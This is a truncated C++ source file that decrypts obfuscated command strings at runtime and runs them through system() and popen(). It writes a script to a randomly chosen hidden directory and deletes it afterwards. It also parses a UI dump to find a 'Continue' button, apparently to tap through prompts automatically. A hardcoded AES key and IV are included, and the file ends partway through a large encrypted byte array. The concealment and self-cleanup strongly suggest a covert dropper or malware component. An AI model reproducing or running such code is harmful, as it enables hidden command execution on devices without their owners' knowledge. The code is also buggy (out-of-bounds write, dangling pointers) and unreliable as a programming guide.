#include "cipher.h"
#include "base64.h"
#include "base642.h"
#include "AES.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#include <regex>

using namespace std;

#define BUFSIZE 512

char script_path[4000];
void getCoords(std::string inp);
string parse_output(const char* command);
string parse_output2(const char* command);
string decrypt(unsigned char arr[], int len) {
    unsigned char plain[len+1];
    memcpy(plain, arr, len);
    plain[len+1] = '\0';
    string base64 = "";
    for(int i = 0; i < len; i++) base64 += plain[i];
    string decoded = base64_decode(base64);
    Cipher::decrypt(decoded);
    return decoded;
}

void  ALARMhandler(int sig)
{
  unsigned char uiauto[] = {0x44, 0x77, 0x74, 0x2f, 0x6b, 0x66, 0x58, 0x46, 0x56, 0x58, 0x70, 0x53, 0x73, 0x57, 0x65, 0x52, 0x63, 0x75, 0x54, 0x6e, 0x4a, 0x46, 0x39, 0x4b, 0x33, 0x36, 0x44, 0x7a, 0x76, 0x72, 0x4e, 0x71, 0x52, 0x32, 0x70, 0x69, 0x46, 0x37, 0x32, 0x46, 0x66, 0x56, 0x69, 0x62, 0x70, 0x78, 0x54, 0x59, 0x58, 0x50, 0x41, 0x6f, 0x37, 0x56, 0x4d, 0x6b, 0x6c, 0x72, 0x53, 0x68, 0x78, 0x52, 0x76, 0x68, 0x4b, 0x77, 0x38, 0x52, 0x45, 0x55, 0x34, 0x2b, 0x69, 0x6d, 0x69, 0x4a, 0x68, 0x30, 0x69, 0x4e, 0x71, 0x44, 0x77, 0x55, 0x69, 0x61, 0x72, 0x4d, 0x4b, 0x71, 0x78, 0x69, 0x53, 0x30, 0x42, 0x42, 0x6e, 0x58, 0x4f, 0x50, 0x66, 0x49, 0x79, 0x31, 0x58, 0x6b, 0x32, 0x76, 0x4f, 0x4a, 0x4e, 0x35, 0x59, 0x32, 0x54, 0x6c, 0x62, 0x68, 0x39, 0x35, 0x6a, 0x62, 0x7a, 0x50, 0x53, 0x69, 0x53, 0x36, 0x50, 0x62, 0x62, 0x4b, 0x41, 0x52, 0x52, 0x65, 0x77, 0x39, 0x55, 0x6e, 0x75, 0x5a, 0x6c, 0x2b, 0x55, 0x73, 0x33, 0x59, 0x56, 0x74, 0x2b, 0x61, 0x4d, 0x54, 0x34, 0x58, 0x77, 0x79, 0x72, 0x79, 0x49, 0x66, 0x34, 0x44, 0x39, 0x70, 0x54, 0x41, 0x2f, 0x54, 0x6b, 0x3d};
  std::string uiauto_ = decrypt(uiauto, sizeof(uiauto));
  const char * uiautocmd = uiauto_.c_str();
  string uidump = parse_output2(uiautocmd);
  //getCoords(str(uidump));
  unsigned char system1[] = {0x37, 0x6c, 0x48, 0x37, 0x30, 0x6e, 0x4b, 0x73, 0x70, 0x71, 0x58, 0x72, 0x73, 0x71, 0x47, 0x54, 0x61, 0x54, 0x59, 0x43, 0x2b, 0x77, 0x38, 0x39, 0x78, 0x71, 0x4d, 0x4c, 0x35, 0x58, 0x45, 0x50, 0x6b, 0x37, 0x63, 0x56, 0x6c, 0x41, 0x55, 0x46, 0x42, 0x51, 0x55, 0x3d};
  const char * system1_ = decrypt(system1, sizeof(system1)).c_str();
  system(system1_);
  usleep(5000000);
  unsigned char system2[] = {0x38, 0x54, 0x53, 0x66, 0x6e, 0x45, 0x76, 0x4a, 0x6c, 0x52, 0x68, 0x42, 0x70, 0x77, 0x37, 0x49, 0x5a, 0x6c, 0x61, 0x33, 0x4c, 0x57, 0x66, 0x46, 0x72, 0x51, 0x49, 0x46, 0x42, 0x51, 0x55, 0x46, 0x42, 0x51, 0x55, 0x46, 0x42, 0x51, 0x55, 0x46, 0x42, 0x51, 0x55, 0x3d};
  const char * system2_ = decrypt(system2, sizeof(system2)).c_str();
  system(system2_);
  remove(script_path);
}

int folderExists(const char* dirname)
{
    DIR* dir = opendir(dirname);
    if (dir) {
        closedir(dir);
        return 1;
    }
    else {
        return -1;
    }
}

void getCoords(std::string inp)
{
 std::string str(inp);
std::regex rx("<node[^\\/]*text=\"Continue\"[^\\/]*bounds=\"(\\[([^\\]]*)\\]\\[([^\\]]*)\\])\"[^\\/]*(\\/>|<\\/node>)" );
std::match_results< std::string::const_iterator > mr;

std::regex_search(str, mr, rx);

printf(mr.str(2).c_str());
}

string parse_output(const char* command) {

    char buf[BUFSIZE];
    string ret = "";
    FILE *fp;

    if ((fp = popen(command, "r")) == NULL) {
        unsigned char err[] = {0x31, 0x38, 0x69, 0x77, 0x47, 0x79, 0x66, 0x5a, 0x74, 0x36, 0x71, 0x6c, 0x57, 0x54, 0x2b, 0x74, 0x67, 0x6a, 0x75, 0x52, 0x4d, 0x74, 0x4a, 0x61, 0x44, 0x74, 0x73, 0x46, 0x42, 0x51, 0x55, 0x46, 0x42, 0x51, 0x55, 0x46, 0x42, 0x51, 0x55, 0x46, 0x42, 0x51, 0x55, 0x3d};
        std::string err_ = decrypt(err, sizeof(err));
                const char * err1_ = err_.c_str();
                printf(err1_);
        return ret;
    }

    while (fgets(buf, BUFSIZE, fp) != NULL) {
       //printf(buf);
       ret += buf;
    }

    if(pclose(fp))  {
                unsigned char err[] = {0x37, 0x78, 0x42, 0x4f, 0x6b, 0x38, 0x57, 0x72, 0x59, 0x37, 0x4f, 0x79, 0x4a, 0x30, 0x51, 0x4e, 0x4a, 0x63, 0x2f, 0x6b, 0x4e, 0x31, 0x45, 0x6f, 0x78, 0x51, 0x52, 0x50, 0x73, 0x4e, 0x6c, 0x34, 0x4a, 0x64, 0x4a, 0x50, 0x79, 0x73, 0x38, 0x36, 0x6b, 0x62, 0x68, 0x67, 0x4d, 0x65, 0x42, 0x4a, 0x50, 0x77, 0x4b, 0x64, 0x4c, 0x4e, 0x37, 0x77, 0x45, 0x71, 0x35, 0x6f, 0x74, 0x79, 0x4c, 0x4b};
        std::string err_ = decrypt(err, sizeof(err));
                const char * err1_ = err_.c_str();
                printf(err1_);
        return ret;
    }
    return ret;
}

string parse_output2(const char* command) {

    char buf[BUFSIZE];
    string ret = "";
    FILE *fp;

    if ((fp = popen(command, "r")) == NULL) {
        unsigned char err[] = {0x31, 0x38, 0x69, 0x77, 0x47, 0x79, 0x66, 0x5a, 0x74, 0x36, 0x71, 0x6c, 0x57, 0x54, 0x2b, 0x74, 0x67, 0x6a, 0x75, 0x52, 0x4d, 0x74, 0x4a, 0x61, 0x44, 0x74, 0x73, 0x46, 0x42, 0x51, 0x55, 0x46, 0x42, 0x51, 0x55, 0x46, 0x42, 0x51, 0x55, 0x46, 0x42, 0x51, 0x55, 0x3d};
        std::string err_ = decrypt(err, sizeof(err));
                const char * err1_ = err_.c_str();
                printf(err1_);
        return ret;
    }

    while (fgets(buf, BUFSIZE, fp) != NULL) {
       //printf(buf);
       ret += buf;
    }

    if(pclose(fp))  {
                unsigned char err[] = {0x37, 0x78, 0x42, 0x4f, 0x6b, 0x38, 0x57, 0x72, 0x59, 0x37, 0x4f, 0x79, 0x4a, 0x30, 0x51, 0x4e, 0x4a, 0x63, 0x2f, 0x6b, 0x4e, 0x31, 0x45, 0x6f, 0x78, 0x51, 0x52, 0x50, 0x73, 0x4e, 0x6c, 0x34, 0x4a, 0x64, 0x4a, 0x50, 0x79, 0x73, 0x38, 0x36, 0x6b, 0x62, 0x68, 0x67, 0x4d, 0x65, 0x42, 0x4a, 0x50, 0x77, 0x4b, 0x64, 0x4c, 0x4e, 0x37, 0x77, 0x45, 0x71, 0x35, 0x6f, 0x74, 0x79, 0x4c, 0x4b};
        std::string err_ = decrypt(err, sizeof(err));
                const char * err1_ = err_.c_str();
                printf(err1_);
        return ret;
    }
    return ret;
}

void printEncrypted(string input)
{
    unsigned char *key = (unsigned char *)"bf3c199c2470cb477d907b1e0917c17b";
    unsigned char *iv = (unsigned char *)"5183666c72eec9e4";
    unsigned char *plaintext = (unsigned char*)input.c_str();
    unsigned char *ciphertext;
    unsigned char *decryptedtext;
    unsigned char base64text[2048];
    unsigned char ciphertext1[2048];
    unsigned int ciphertext_len, cipher_len, ciphertext1_len;
    AES aes(256);
    ciphertext = aes.EncryptECB(plaintext, strlen ((char *)plaintext), key, ciphertext_len);
    base642_encode(ciphertext, ciphertext_len, base64text, cipher_len);
    printf("%s", base64text);
}

int main(int argc, char* argv[])
{

    if(argc != 4)
    {
        return -1;
    }

    strcpy(script_path, "");
    unsigned char dir1[] = {0x44, 0x77, 0x74, 0x2f, 0x6b, 0x62, 0x76, 0x4b, 0x79, 0x4e, 0x73, 0x65, 0x35, 0x50, 0x58, 0x55, 0x34, 0x6d, 0x34, 0x34, 0x41, 0x67, 0x3d, 0x3d};
    std::string sdir1_ = decrypt(dir1, sizeof(dir1));
    const char * dir1_ = sdir1_.c_str();
    unsigned char dir2[] = {0x44, 0x77, 0x74, 0x2f, 0x6b, 0x5a, 0x75, 0x5a, 0x2f, 0x66, 0x4d, 0x43, 0x51, 0x77, 0x79, 0x33, 0x75, 0x61, 0x42, 0x59, 0x62, 0x67, 0x3d, 0x3d};
    std::string sdir2_ = decrypt(dir2, sizeof(dir2));
    const char * dir2_ = sdir2_.c_str();
    unsigned char dir3[] = {0x44, 0x77, 0x74, 0x2f, 0x6b, 0x64, 0x65, 0x4c, 0x30, 0x51, 0x64, 0x37, 0x47, 0x53, 0x67, 0x68, 0x75, 0x61, 0x42, 0x59, 0x62, 0x67, 0x3d, 0x3d};
     std::string sdir3_ = decrypt(dir3, sizeof(dir3));
    const char * dir3_ = sdir3_.c_str();
    const char* dirs[3];
    dirs[0] = dir1_;
    dirs[1] = dir2_;
    dirs[2] = dir3_;

    int i;
    for (i = 0; i < 3; i++) {
        if (folderExists(dirs[i]) < 0) {
            return -99;
        }
    }

    srand(time(0));
        int dirIndex = rand() % 2;
    strcpy(script_path, dirs[dirIndex]);
        unsigned char scrpth[] = {0x5a, 0x5a, 0x71, 0x65, 0x39, 0x6e, 0x4e, 0x32, 0x38, 0x4c, 0x5a, 0x6e, 0x6f, 0x39, 0x72, 0x2b, 0x75, 0x61, 0x42, 0x59, 0x62, 0x67, 0x3d, 0x3d};
        std::string scrpth_ = decrypt(scrpth, sizeof(scrpth));
    const char * scrpth3_ = scrpth_.c_str();
        strcat(script_path, scrpth3_);

    FILE* fp;

        unsigned char script1[] = {0x38, 0x75, 0x4b, 0x4a, 0x69, 0x74, 0x67, 0x51, 0x37, 0x6c, 0x39, 0x51, 0x31, 0x7a, 0x65, 0x7a, 0x36, 0x32, 0x44, 0x66, 0x4e, 0x49, 0x56, 0x41, 0x30, 0x33, 0x76, 0x4c, 0x37, 0x65, 0x31, 0x50, 0x35, 0x5a, 0x54, 0x78, 0x30, 0x69, 0x35, 0x36, 0x2b, 0x7a, 0x5a, 0x30, 0x4b, 0x42, 0x4d, 0x41, 0x64, 0x65, 0x2b, 0x56, 0x42, 0x59, 0x49, 0x6b, 0x74, 0x77, 0x69, 0x4f, 0x4b, 0x79, 0x79, 0x35, 0x4d, 0x2b, 0x5a, 0x43, 0x52, 0x37, 0x6d, 0x67, 0x61, 0x62, 0x4e, 0x43, 0x4c, 0x6c, 0x2b, 0x54, 0x68, 0x72, 0x46, 0x51, 0x38, 0x33, 0x51, 0x79, 0x59, 0x35, 0x35, 0x64, 0x76, 0x53, 0x4f, 0x31, 0x57, 0x64, 0x30, 0x77, 0x49, 0x65, 0x68, 0x38, 0x4c, 0x53, 0x37, 0x46, 0x59, 0x73, 0x30, 0x66, 0x4c, 0x73, 0x38, 0x76, 0x37, 0x47, 0x43, 0x2f, 0x66, 0x7a, 0x50, 0x54, 0x59, 0x2b, 0x30, 0x6c, 0x42, 0x59, 0x68, 0x43, 0x54, 0x6a, 0x44, 0x6f, 0x65, 0x76, 0x7a, 0x68, 0x4a, 0x71, 0x59, 0x5a, 0x64, 0x39, 0x5a, 0x67, 0x54, 0x45, 0x47, 0x38, 0x53, 0x52, 0x47, 0x34, 0x36, 0x42, 0x48, 0x36, 0x2f, 0x74, 0x5a, 0x5a, 0x55, 0x70, 0x56, 0x6f, 0x48, 0x68, 0x49, 0x76, 0x62, 0x66, 0x44, 0x32, 0x50, 0x63, 0x30, 0x68, 0x45, 0x42, 0x54, 0x71, 0x4c, 0x49, 0x79, 0x71, 0x77, 0x70, 0x58, 0x36, 0x49, 0x6f, 0x4e, 0x6d, 0x6f, 0x6e, 0x48, 0x45, 0x6f, 0x73, 0x77, 0x6e, 0x49, 0x74, 0x34, 0x50, 0x6b, 0x59, 0x69, 0x57, 0x70, 0x6d, 0x53, 0x37, 0x34, 0x2f, 0x69, 0x58, 0x43, 0x4d, 0x44, 0x50, 0x2b, 0x4d, 0x46, 0x67, 0x39, 0x68, 0x63, 0x32, 0x6d, 0x65, 0x6b, 0x31, 0x5a, 0x61, 0x55, 0x52, 0x47, 0x6e, 0x78, 0x6f, 0x70, 0x4e, 0x5a, 0x67, 0x54, 0x48, 0x65, 0x38, 0x53, 0x52, 0x46, 0x42, 0x35, 0x68, 0x58, 0x2f, 0x57, 0x79, 0x77, 0x50, 0x6a, 0x67, 0x58, 0x2b, 0x6d, 0x37, 0x52, 0x77, 0x66, 0x79, 0x2f, 0x6a, 0x6b, 0x68, 0x2b, 0x44, 0x73, 0x41, 0x6a, 0x75, 0x2b, 0x67, 0x34, 0x50, 0x42, 0x58, 0x58, 0x76, 0x6c, 0x65, 0x56, 0x49, 0x4d, 0x2b, 0x78, 0x79, 0x4b, 0x45, 0x70, 0x57, 0x6c, 0x50, 0x48, 0x53, 0x35, 0x55, 0x4c, 0x6c, 0x73, 0x33, 0x4c, 0x70, 0x75, 0x41, 0x51, 0x5a, 0x61, 0x4f, 0x45, 0x66, 0x33, 0x33, 0x6c, 0x42, 0x69, 0x66, 0x2b, 0x78, 0x74, 0x49, 0x2f, 0x6a, 0x45, 0x41, 0x73, 0x36, 0x4c, 0x4b, 0x75, 0x44, 0x72, 0x59, 0x78, 0x46, 0x2b, 0x59, 0x39, 0x39, 0x41, 0x73, 0x54, 0x64, 0x69, 0x4a, 0x74, 0x36, 0x46, 0x7a, 0x58, 0x51, 0x32, 0x73, 0x65, 0x66, 0x42, 0x42, 0x6e, 0x70, 0x75, 0x43, 0x41, 0x68, 0x74, 0x6a, 0x71, 0x51, 0x37, 0x36, 0x39, 0x35, 0x56, 0x53, 0x32, 0x4e, 0x55, 0x46, 0x65, 0x4f, 0x64, 0x2b, 0x30, 0x66, 0x52, 0x34, 0x4f, 0x76, 0x59, 0x39, 0x76, 0x71, 0x59, 0x52, 0x77, 0x59, 0x58, 0x4c, 0x67, 0x44, 0x4c, 0x46, 0x2b, 0x34, 0x55, 0x34, 0x4d, 0x32, 0x65, 0x51, 0x73, 0x36, 0x4c, 0x42, 0x44, 0x79, 0x63, 0x52, 0x4d, 0x6d, 0x54, 0x5a, 0x33, 0x66, 0x56, 0x4d, 0x54, 0x64, 0x69, 0x41, 0x4a, 0x48, 0x4a, 0x75, 0x45, 0x45, 0x37, 0x72, 0x35, 0x73, 0x61, 0x54, 0x64, 0x39, 0x79, 0x6d, 0x5a, 0x46, 0x79, 0x38, 0x57, 0x47, 0x75, 0x63, 0x73, 0x53, 0x78, 0x57, 0x47, 0x68, 0x50, 0x76, 0x7a, 0x77, 0x74, 0x46, 0x6c, 0x76, 0x69, 0x56, 0x65, 0x35, 0x48, 0x75, 0x4a, 0x2b, 0x4c, 0x46, 0x67, 0x59, 0x69, 0x48, 0x31, 0x6e, 0x66, 0x37, 0x7a, 0x30, 0x58, 0x49, 0x5a, 0x63, 0x44, 0x42, 0x57, 0x34, 0x69, 0x62, 0x67, 0x63, 0x33, 0x67, 0x38, 0x6e, 0x49, 0x75, 0x61, 0x39, 0x43, 0x2b, 0x74, 0x59, 0x30, 0x6a, 0x56, 0x70, 0x75, 0x4e, 0x4c, 0x43, 0x6e, 0x4b, 0x4e, 0x72, 0x58, 0x76, 0x6f, 0x78, 0x45, 0x6a, 0x35, 0x65, 0x58, 0x2b, 0x70, 0x50, 0x64, 0x73, 0x4f, 0x47, 0x6a, 0x31, 0x74, 0x6f, 0x34, 0x52, 0x2f, 0x66, 0x65, 0x55, 0x47, 0x4a, 0x2f, 0x37, 0x47, 0x30, 0x6a, 0x2b, 0x4d, 0x51, 0x43, 0x7a, 0x6f, 0x73, 0x71, 0x34, 0x4f, 0x74, 0x6a, 0x45, 0x58, 0x35, 0x6a, 0x33, 0x30, 0x43, 0x78, 0x4e, 0x32, 0x49, 0x6d, 0x33, 0x6f, 0x58, 0x4e, 0x64, 0x44, 0x61, 0x78, 0x35, 0x38, 0x45, 0x47, 0x65, 0x6d, 0x34, 0x4a, 0x64, 0x53, 0x4c, 0x54, 0x51, 0x38, 0x6e, 0x49, 0x74, 0x36, 0x39, 0x43, 0x2b, 0x76, 0x6d, 0x30, 0x6a, 0x56, 0x70, 0x57, 0x4e, 0x4c, 0x43, 0x6e, 0x4c, 0x68, 0x72, 0x58, 0x76, 0x71, 0x6a, 0x45, 0x6a, 0x35, 0x65, 0x4d, 0x65, 0x70, 0x50, 0x64, 0x6c, 0x2b, 0x47, 0x6a, 0x31, 0x76, 0x44, 0x39, 0x46, 0x78, 0x2f, 0x76, 0x41, 0x77, 0x56, 0x68, 0x6c, 0x79, 0x34, 0x48, 0x4c, 0x69, 0x4a, 0x4a, 0x79, 0x4c, 0x65, 0x44, 0x34, 0x70, 0x32, 0x64, 0x69, 0x4a, 0x44, 0x2b, 0x75, 0x77, 0x30, 0x6c, 0x77, 0x62, 0x53, 0x38, 0x46, 0x79, 0x34, 0x48, 0x42, 0x68, 0x66, 0x75, 0x41, 0x4d, 0x73, 0x4e, 0x6e, 0x6c, 0x54, 0x67, 0x79, 0x77, 0x51, 0x43, 0x7a, 0x6f, 0x54, 0x4a, 0x76, 0x4a, 0x78, 0x33, 0x31, 0x52, 0x4e, 0x6e, 0x59, 0x67, 0x43, 0x78, 0x4e, 0x33, 0x68, 0x42, 0x45, 0x63, 0x6d, 0x62, 0x47, 0x6e, 0x75, 0x76, 0x73, 0x70, 0x6d, 0x4e, 0x33, 0x32, 0x34, 0x65, 0x54, 0x53, 0x42, 0x53, 0x30, 0x67, 0x4a, 0x46, 0x33, 0x5a, 0x4a, 0x48, 0x69, 0x44, 0x58, 0x38, 0x50, 0x34, 0x4d, 0x59, 0x36, 0x6b, 0x62, 0x43, 0x5a, 0x75, 0x30, 0x63, 0x50, 0x36, 0x76, 0x62, 0x42, 0x79, 0x7a, 0x4c, 0x36, 0x43, 0x30, 0x68, 0x66, 0x57, 0x6e, 0x30, 0x74, 0x76, 0x4a, 0x4d, 0x46, 0x44, 0x39, 0x4b, 0x79, 0x79, 0x35, 0x6a, 0x75, 0x5a, 0x43, 0x52, 0x7a, 0x4f, 0x67, 0x61, 0x62, 0x4f, 0x35, 0x68, 0x62, 0x4f, 0x4e, 0x35, 0x73, 0x2f, 0x47, 0x70, 0x38, 0x75, 0x52, 0x37, 0x31, 0x41, 0x6d, 0x50, 0x63, 0x30, 0x68, 0x45, 0x41, 0x52, 0x48, 0x4a, 0x75, 0x46, 0x6d, 0x5a, 0x61, 0x72, 0x50, 0x4e, 0x65, 0x6b, 0x68, 0x54, 0x49, 0x55, 0x76, 0x6f, 0x4c, 0x54, 0x62, 0x39, 0x61, 0x66, 0x53, 0x44, 0x61, 0x6e, 0x41, 0x38, 0x33, 0x44, 0x2b, 0x6d, 0x37, 0x54, 0x49, 0x71, 0x57, 0x54, 0x66, 0x42, 0x35, 0x31, 0x7a, 0x33, 0x30, 0x47, 0x30, 0x4b, 0x62, 0x53, 0x61, 0x52, 0x68, 0x31, 0x33, 0x49, 0x66, 0x2b, 0x6a, 0x61, 0x50, 0x43, 0x6a, 0x78, 0x61, 0x53, 0x58, 0x45, 0x2b, 0x72, 0x6e, 0x70, 0x37, 0x78, 0x50, 0x34, 0x62, 0x6d, 0x4f, 0x4b, 0x79, 0x78, 0x48, 0x4d, 0x2b, 0x5a, 0x43, 0x73, 0x37, 0x6d, 0x67, 0x61, 0x59, 0x33, 0x6d, 0x68, 0x62, 0x4f, 0x6e, 0x79, 0x38, 0x2f, 0x47, 0x55, 0x43, 0x61, 0x52, 0x37, 0x79, 0x45, 0x51, 0x50, 0x63, 0x30, 0x6d, 0x34, 0x51, 0x52, 0x48, 0x71, 0x73, 0x39, 0x6d, 0x5a, 0x65, 0x78, 0x50, 0x2b, 0x38, 0x72, 0x66, 0x42, 0x35, 0x31, 0x7a, 0x74, 0x45, 0x47, 0x30, 0x4b, 0x58, 0x65, 0x61, 0x52, 0x68, 0x31, 0x6f, 0x49, 0x66, 0x2b, 0x6a, 0x70, 0x50, 0x43, 0x6a, 0x78, 0x65, 0x65, 0x58, 0x45, 0x2b, 0x71, 0x74, 0x66, 0x2f, 0x62, 0x42, 0x6d, 0x37, 0x52, 0x77, 0x2f, 0x75, 0x38, 0x59, 0x4a, 0x66, 0x43, 0x66, 0x43, 0x67, 0x38, 0x37, 0x65, 0x4c, 0x56, 0x52, 0x5a, 0x6c, 0x6b, 0x36, 0x65, 0x6b, 0x4a, 0x63, 0x53, 0x4f, 0x45, 0x55, 0x47, 0x46, 0x79, 0x34, 0x48, 0x43, 0x78, 0x66, 0x75, 0x41, 0x4f, 0x44, 0x4e, 0x6e, 0x6c, 0x54, 0x4f, 0x69, 0x77, 0x51, 0x43, 0x33, 0x45, 0x54, 0x4a, 0x76, 0x4b, 0x64, 0x33, 0x31, 0x52, 0x4e, 0x33, 0x59, 0x67, 0x43, 0x78, 0x43, 0x62, 0x68, 0x42, 0x45, 0x65, 0x2b, 0x62, 0x47, 0x6e, 0x75, 0x66, 0x63, 0x70, 0x6d, 0x4e, 0x36, 0x5a, 0x76, 0x79, 0x65, 0x54, 0x73, 0x4e, 0x45, 0x50, 0x36, 0x7a, 0x58, 0x36, 0x77, 0x4e, 0x35, 0x39, 0x65, 0x70, 0x43, 0x46, 0x2f, 0x76, 0x50, 0x52, 0x63, 0x68, 0x6c, 0x77, 0x4d, 0x46, 0x65, 0x58, 0x6f, 0x38, 0x45, 0x67, 0x39, 0x36, 0x4a, 0x6d, 0x67, 0x47, 0x31, 0x39, 0x78, 0x31, 0x73, 0x65, 0x54, 0x6e, 0x79, 0x50, 0x68, 0x48, 0x39, 0x39, 0x6f, 0x51, 0x59, 0x6e, 0x2f, 0x65, 0x62, 0x53, 0x50, 0x34, 0x37, 0x45, 0x4c, 0x4f, 0x69, 0x77, 0x51, 0x67, 0x36, 0x32, 0x4d, 0x71, 0x2f, 0x6d, 0x50, 0x66, 0x55, 0x58, 0x45, 0x33, 0x59, 0x67, 0x43, 0x65, 0x68, 0x63, 0x31, 0x6d, 0x39, 0x72, 0x48, 0x6e, 0x39, 0x41, 0x5a, 0x36, 0x62, 0x67, 0x45, 0x6b, 0x54, 0x59, 0x41, 0x65, 0x35, 0x6d, 0x67, 0x50, 0x65, 0x68, 0x78, 0x31, 0x68, 0x74, 0x66, 0x6e, 0x79, 0x50, 0x48, 0x6b, 0x33, 0x2b, 0x38, 0x39, 0x46, 0x79, 0x47, 0x58, 0x41, 0x77, 0x56, 0x56, 0x75, 0x78, 0x52, 0x6a, 0x33, 0x63, 0x34, 0x4c, 0x51, 0x79, 0x44, 0x51, 0x7a, 0x48, 0x43, 0x4b, 0x79, 0x79, 0x35, 0x6a, 0x75, 0x5a, 0x43, 0x52, 0x7a, 0x4e, 0x4f, 0x2f, 0x37, 0x48, 0x37, 0x4e, 0x2b, 0x4a, 0x71, 0x49, 0x71, 0x76, 0x63, 0x68, 0x39, 0x2b, 0x4d, 0x36, 0x4f, 0x4c, 0x6d, 0x79, 0x62, 0x7a, 0x71, 0x52, 0x6e, 0x2b, 0x38, 0x39, 0x46, 0x79, 0x47, 0x58, 0x41, 0x77, 0x56, 0x7a, 0x4f, 0x72, 0x71, 0x31, 0x2b, 0x72, 0x6e, 0x6a, 0x4a, 0x42, 0x4f, 0x4f, 0x43, 0x50, 0x53, 0x71, 0x33, 0x31, 0x74, 0x57, 0x35, 0x30, 0x50, 0x6a, 0x45, 0x43, 0x35, 0x6a, 0x69, 0x73, 0x73, 0x52, 0x7a, 0x50, 0x6d, 0x51, 0x72, 0x4f, 0x35, 0x6f, 0x47, 0x6d, 0x4e, 0x35, 0x6f, 0x57, 0x7a, 0x70, 0x38, 0x76, 0x50, 0x78, 0x6c, 0x41, 0x6d, 0x6b, 0x65, 0x38, 0x68, 0x45, 0x44, 0x33, 0x4e, 0x4a, 0x75, 0x45, 0x45, 0x52, 0x36, 0x72, 0x50, 0x5a, 0x6d, 0x57, 0x62, 0x2b, 0x62, 0x44, 0x70, 0x47, 0x56, 0x66, 0x57, 0x6a, 0x6d, 0x68, 0x35, 0x73, 0x36, 0x31, 0x6e, 0x63, 0x50, 0x6e, 0x6f, 0x2f, 0x30, 0x72, 0x39, 0x51, 0x6c, 0x78, 0x2f, 0x76, 0x50, 0x51, 0x56, 0x68, 0x6c, 0x77, 0x4d, 0x6a, 0x50, 0x4f, 0x66, 0x4c, 0x63, 0x41, 0x55, 0x37, 0x41, 0x67, 0x66, 0x33, 0x32, 0x6a, 0x68, 0x69, 0x66, 0x39, 0x35, 0x51, 0x62, 0x30, 0x51, 0x54, 0x75, 0x4d, 0x73, 0x75, 0x59, 0x34, 0x72, 0x52, 0x71, 0x55, 0x57, 0x51, 0x4b, 0x6d, 0x53, 0x36, 0x7a, 0x59, 0x55, 0x37, 0x41, 0x6a, 0x41, 0x66, 0x37, 0x7a, 0x30, 0x58, 0x49, 0x5a, 0x63, 0x44, 0x42, 0x57, 0x34, 0x69, 0x62, 0x67, 0x63, 0x33, 0x67, 0x38, 0x6e, 0x49, 0x6e, 0x35, 0x72, 0x79, 0x66, 0x32, 0x4f, 0x69, 0x5a, 0x34, 0x39, 0x55, 0x65, 0x6d, 0x69, 0x4c, 0x53, 0x4c, 0x65, 0x32, 0x30, 0x6f, 0x45, 0x47, 0x65, 0x6d, 0x34, 0x79, 0x43, 0x31, 0x65, 0x37, 0x33, 0x6b, 0x30, 0x67, 0x62, 0x69, 0x66, 0x58, 0x71, 0x51, 0x68, 0x77, 0x2b, 0x6c, 0x48, 0x50, 0x41, 0x48, 0x59, 0x77, 0x49, 0x71, 0x44, 0x73, 0x41, 0x67, 0x66, 0x2b, 0x67, 0x34, 0x50, 0x37, 0x6e, 0x58, 0x76, 0x6c, 0x51, 0x55, 0x32, 0x31, 0x48, 0x74, 0x7a, 0x4c, 0x4b, 0x68, 0x44, 0x46, 0x32, 0x37, 0x67, 0x58, 0x32, 0x63, 0x6d, 0x62, 0x69, 0x70, 0x68, 0x56, 0x45, 0x6b, 0x58, 0x4a, 0x78, 0x4b, 0x63, 0x77, 0x53, 0x57, 0x4f, 0x7a, 0x56, 0x63, 0x46, 0x49, 0x74, 0x34, 0x50, 0x4a, 0x79, 0x38, 0x58, 0x69, 0x30, 0x4e, 0x52, 0x36, 0x61, 0x49, 0x74, 0x2b, 0x69, 0x79, 0x6e, 0x43, 0x70, 0x75, 0x30, 0x63, 0x50, 0x36, 0x76, 0x62, 0x42, 0x79, 0x7a, 0x4c, 0x36, 0x43, 0x30, 0x68, 0x57, 0x54, 0x6f, 0x2f, 0x48, 0x37, 0x47, 0x57, 0x75, 0x70, 0x46, 0x6c, 0x57, 0x54, 0x50, 0x52, 0x41, 0x35, 0x6b, 0x70, 0x64, 0x6c, 0x66, 0x63, 0x64, 0x59, 0x62, 0x41, 0x72, 0x4f, 0x6f, 0x34, 0x69, 0x77, 0x2b, 0x32, 0x4c, 0x67, 0x6a, 0x4f, 0x35, 0x56, 0x36, 0x46, 0x79, 0x79, 0x6f, 0x51, 0x36, 0x41, 0x35, 0x37, 0x7a, 0x51, 0x6e, 0x49, 0x74, 0x34, 0x50, 0x43, 0x2b, 0x76, 0x6d, 0x76, 0x54, 0x56, 0x70, 0x57, 0x4e, 0x4c, 0x43, 0x6e, 0x4c, 0x6a, 0x53, 0x58, 0x76, 0x71, 0x6a, 0x61, 0x7a, 0x35, 0x65, 0x4d, 0x52, 0x4a, 0x50, 0x64, 0x6c, 0x2f, 0x71, 0x6a, 0x31, 0x76, 0x44, 0x68, 0x6c, 0x56, 0x76, 0x2f, 0x53, 0x75, 0x76, 0x48, 0x30, 0x65, 0x44, 0x52, 0x5a, 0x41, 0x41, 0x31, 0x55, 0x6b, 0x58, 0x4a, 0x31, 0x54, 0x2b, 0x4f, 0x2f, 0x6e, 0x30, 0x44, 0x79, 0x63, 0x69, 0x33, 0x72, 0x30, 0x4c, 0x36, 0x2b, 0x62, 0x53, 0x4e, 0x57, 0x6c, 0x59, 0x30, 0x73, 0x4b, 0x63, 0x75, 0x47, 0x74, 0x65, 0x2b, 0x71, 0x50, 0x78, 0x6f, 0x78, 0x47, 0x6a, 0x68, 0x67, 0x59, 0x31, 0x79, 0x68, 0x32, 0x67, 0x4b, 0x39, 0x35, 0x47, 0x54, 0x54, 0x41, 0x34, 0x2f, 0x30, 0x6a, 0x6b, 0x44, 0x38, 0x43, 0x37, 0x4e, 0x31, 0x4b, 0x57, 0x6b, 0x33, 0x45, 0x56, 0x55, 0x70, 0x43, 0x71, 0x4a, 0x4a, 0x77, 0x55, 0x4c, 0x6c, 0x50, 0x41, 0x77, 0x43, 0x2b, 0x42, 0x41, 0x46, 0x44, 0x46, 0x56, 0x58, 0x57, 0x2b, 0x51, 0x30, 0x54, 0x6f, 0x64, 0x57, 0x71, 0x6e, 0x4f, 0x72, 0x65, 0x65, 0x62, 0x46, 0x57, 0x71, 0x44, 0x57, 0x34, 0x51, 0x35, 0x2b, 0x58, 0x51, 0x58, 0x35, 0x35, 0x78, 0x75, 0x30, 0x6f, 0x54, 0x4e, 0x2b, 0x43, 0x69, 